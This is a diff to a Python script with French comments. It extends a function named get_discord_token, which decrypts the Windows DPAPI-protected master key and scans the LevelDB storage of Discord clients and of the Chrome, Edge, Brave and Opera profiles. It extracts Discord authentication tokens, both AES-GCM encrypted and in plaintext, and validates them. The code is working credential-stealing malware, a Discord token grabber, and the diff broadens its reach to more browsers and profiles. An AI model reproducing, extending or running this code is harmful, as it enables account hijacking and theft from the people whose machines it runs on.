@@ -920,33 +920,94 @@ def get_discord_token():
           
      def dpapi_decrypt(data):
           try:
-               blob_in = DATA_BLOB(len(data), windll.kernel32.LocalAlloc(0x40, len(data)))
-               ctypes.memmove(blob_in.pbData, data, len(data))
-               blob_out = DATA_BLOB()
-               if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
-                    decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-                    windll.kernel32.LocalFree(blob_out.pbData)
-                    windll.kernel32.LocalFree(blob_in.pbData)
-                    return decrypted
+               # Utiliser ubyte (unsigned byte) pour éviter les erreurs de signe
+               from ctypes import wintypes
+               class DATA_BLOB_W(ctypes.Structure):
+                    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]
+               
+               crypt32 = ctypes.windll.crypt32
+               crypt32.CryptUnprotectData.argtypes = [
+                    ctypes.POINTER(DATA_BLOB_W),
+                    ctypes.POINTER(wintypes.LPWSTR),
+                    ctypes.POINTER(DATA_BLOB_W),
+                    wintypes.LPVOID,
+                    wintypes.LPVOID,
+                    wintypes.DWORD,
+                    ctypes.POINTER(DATA_BLOB_W)
+               ]
+               
+               in_bytes = (ctypes.c_ubyte * len(data))(*data)
+               blob_in = DATA_BLOB_W(len(data), in_bytes)
+               blob_out = DATA_BLOB_W()
+               descr = wintypes.LPWSTR()
+               
+               success = crypt32.CryptUnprotectData(
+                    ctypes.byref(blob_in),
+                    ctypes.byref(descr),
+                    None,
+                    None,
+                    None,
+                    0,
+                    ctypes.byref(blob_out)
+               )
+               if success:
+                    result = bytes(blob_out.pbData[:blob_out.cbData])
+                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+                    return result
           except Exception:
                pass
           return None
 
+     def is_valid_token(tok):
+          try:
+               parts = tok.split('.')
+               if len(parts) >= 2:
+                    part = parts[0]
+                    part += "=" * ((4 - len(part) % 4) % 4)
+                    decoded = base64.b64decode(part).decode('utf-8', errors='ignore')
+                    if decoded.isdigit() and 17 <= len(decoded) <= 21:
+                         return True
+          except Exception:
+               pass
+          return False
+
      appdata = os.environ.get("APPDATA", "")
-     clients = {
-          "discord": os.path.join(appdata, "discord"),
-          "discordcanary": os.path.join(appdata, "discordcanary"),
-          "discordptb": os.path.join(appdata, "discordptb")
+     localappdata = os.environ.get("LOCALAPPDATA", "")
+     
+     # Définition des chemins d'accès pour tous les navigateurs et clients Discord
+     paths = {
+          "Discord": os.path.join(appdata, "discord"),
+          "Discord Canary": os.path.join(appdata, "discordcanary"),
+          "Discord PTB": os.path.join(appdata, "discordptb"),
+          "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
+          "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
+          "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
+          "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
+          "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable")
      }
      
-     # Chercher d'abord les tokens cryptés (modernes)
-     for client_name, path in clients.items():
+     # 1. Analyse avec décryptage GCM (pour les tokens chiffrés dQw4w9WgXcQ:)
+     for name, path in paths.items():
           local_state_path = os.path.join(path, "Local State")
-          leveldb_path = os.path.join(path, "Local Storage", "leveldb")
-          if not os.path.exists(local_state_path) or not os.path.exists(leveldb_path):
+          
+          # Résolution des sous-dossiers LevelDB pour les navigateurs vs Discord
+          leveldb_dirs = []
+          if "Discord" in name:
+               leveldb_dirs.append(os.path.join(path, "Local Storage", "leveldb"))
+          else:
+               default_ldb = os.path.join(path, "Default", "Local Storage", "leveldb")
+               if os.path.exists(default_ldb):
+                    leveldb_dirs.append(default_ldb)
+               if os.path.exists(path):
+                    for sub in os.listdir(path):
+                         if sub.startswith("Profile "):
+                              profile_ldb = os.path.join(path, sub, "Local Storage", "leveldb")
+                              if os.path.exists(profile_ldb):
+                                   leveldb_dirs.append(profile_ldb)
+                                   
+          if not os.path.exists(local_state_path) or not leveldb_dirs:
                continue
                
-          # 1. Obtenir la clé maîtresse (master key) decrypted
           master_key = None
           try:
                with open(local_state_path, "r", encoding="utf-8") as f:
@@ -959,62 +1020,98 @@ def get_discord_token():
           if not master_key:
                continue
                
-          # 2. Chercher et décrypter les tokens dans le leveldb
           try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
           except ImportError:
                continue
                
-          try:
-               for file in os.listdir(leveldb_path):
-                    if file.endswith(".log") or file.endswith(".ldb"):
-                         filepath = os.path.join(leveldb_path, file)
-                         try:
-                              with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
-                                   content = f.read()
-                              # Recherche de tokens cryptés
-                              for match in re.findall(r"dQw4w9WgXcQ:([^\"']*)", content):
-                                   try:
-                                        encrypted_token = base64.b64decode(match)
-                                        iv = encrypted_token[3:15]
-                                        payload = encrypted_token[15:]
-                                        aesgcm = AESGCM(master_key)
-                                        decrypted = aesgcm.decrypt(payload, iv, None)
-                                        token = decrypted.decode('utf-8')
-                                        if token:
-                                             return token
-                                   except Exception:
-                                        pass
-                         except Exception:
-                              pass
-          except Exception:
-               pass
+          for ldb_dir in leveldb_dirs:
+               if not os.path.exists(ldb_dir):
+                    continue
+               try:
+                    for file in os.listdir(ldb_dir):
+                         if file.endswith(".log") or file.endswith(".ldb"):
+                              filepath = os.path.join(ldb_dir, file)
+                              try:
+                                   with open(filepath, "rb") as f:
+                                        content = f.read()
+                                   
+                                   offset = 0
+                                   while True:
+                                        offset = content.find(b"dQw4w9WgXcQ:", offset)
+                                        if offset == -1:
+                                             break
+                                        
+                                        b64_start = offset + len(b"dQw4w9WgXcQ:")
+                                        b64_end = b64_start
+                                        while b64_end < len(content):
+                                             char = content[b64_end:b64_end+1]
+                                             if char[0] in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=":
+                                                  b64_end += 1
+                                             else:
+                                                  break
+                                        
+                                        b64_token = content[b64_start:b64_end]
+                                        offset = b64_end
+                                        
+                                        if len(b64_token) < 40:
+                                             continue
+                                             
+                                        try:
+                                             encrypted_token = base64.b64decode(b64_token)
+                                             iv = encrypted_token[3:15]
+                                             payload = encrypted_token[15:]
+                                             aesgcm = AESGCM(master_key)
+                                             decrypted = aesgcm.decrypt(payload, iv, None)
+                                             token = decrypted.decode('utf-8')
+                                             if token and is_valid_token(token):
+                                                  return token
+                                        except Exception:
+                                             pass
+                              except Exception:
+                                   pass
+               except Exception:
+                    pass
 
-     # Fallback : recherche de tokens en clair
-     token_patterns = [
-          r'["\']([\w-]{24}\.[\w-]{6}\.[\w-]{27,})["\']',  # Format token moderne
-          r'"token":\s*"([a-zA-Z0-9_.-]{50,100})"',
-          r'token["\']:\s*["\']([a-zA-Z0-9_.-]{50,100})',
-     ]
-     for client_name, path in clients.items():
-          leveldb_path = os.path.join(path, "Local Storage", "leveldb")
-          if not os.path.exists(leveldb_path):
-               continue
-          try:
-               for file in os.listdir(leveldb_path):
-                    if file.endswith(".log") or file.endswith(".ldb"):
-                         filepath = os.path.join(leveldb_path, file)
-                         try:
-                              with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
-                                   content = f.read()
-                              for pattern in token_patterns:
-                                   matches = re.findall(pattern, content)
-                                   if matches:
-                                        return matches[0]
-                         except Exception:
-                              pass
-          except Exception:
-               pass
+     # 2. Analyse en texte brut (pour les navigateurs qui stockent les tokens en clair dans LevelDB)
+     token_pattern = re.compile(br'[\w-]{24}\.[\w-]{6}\.[\w-]{25,}')
+     for name, path in paths.items():
+          if "Discord" in name:
+               continue # Discord n'a plus de tokens en clair
+          
+          leveldb_dirs = []
+          default_ldb = os.path.join(path, "Default", "Local Storage", "leveldb")
+          if os.path.exists(default_ldb):
+               leveldb_dirs.append(default_ldb)
+          if os.path.exists(path):
+               for sub in os.listdir(path):
+                    if sub.startswith("Profile "):
+                         profile_ldb = os.path.join(path, sub, "Local Storage", "leveldb")
+                         if os.path.exists(profile_ldb):
+                              leveldb_dirs.append(profile_ldb)
+                              
+          for ldb_dir in leveldb_dirs:
+               if not os.path.exists(ldb_dir):
+                    continue
+               try:
+                    for file in os.listdir(ldb_dir):
+                         if file.endswith(".log") or file.endswith(".ldb"):
+                              filepath = os.path.join(ldb_dir, file)
+                              try:
+                                   with open(filepath, "rb") as f:
+                                        content = f.read()
+                                   matches = token_pattern.findall(content)
+                                   for match in matches:
+                                        try:
+                                             token = match.decode('utf-8')
+                                             if is_valid_token(token):
+                                                  return token
+                                        except Exception:
+                                             pass
+                              except Exception:
+                                   pass
+               except Exception:
+                    pass
      return "N/A" 
 
 def get_discord_user_id():
@@ -1034,31 +1131,6 @@ def get_discord_user_id():
                         return decoded
          except Exception:
               pass
-
-    # 2. Fallback classique si pas de token ou décodage échoué
-    appdata = os.environ.get("APPDATA", "")
-    discord_paths = [
-        os.path.join(appdata, "discord", "Local Storage", "leveldb"),
-        os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
-        os.path.join(appdata, "discordptb", "Local Storage", "leveldb")
-    ]
-    for path in discord_paths:
-        if not os.path.exists(path):
-            continue
-        try:
-            for file in os.listdir(path):
-                if file.endswith(".log") or file.endswith(".ldb"):
-                    filepath = os.path.join(path, file)
-                    try:
-                        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
-                            content = f.read()
-                            matches = re.findall(r'"user_id_x86":"(\d{17,19})"', content) or re.findall(r'"user_id":"(\d{17,19})"', content)
-                            if matches:
-                                return matches[0]
-                    except Exception:
-                        pass
-        except Exception:
-            pass
     return "N/A"
 
 def get_extended_system_info():
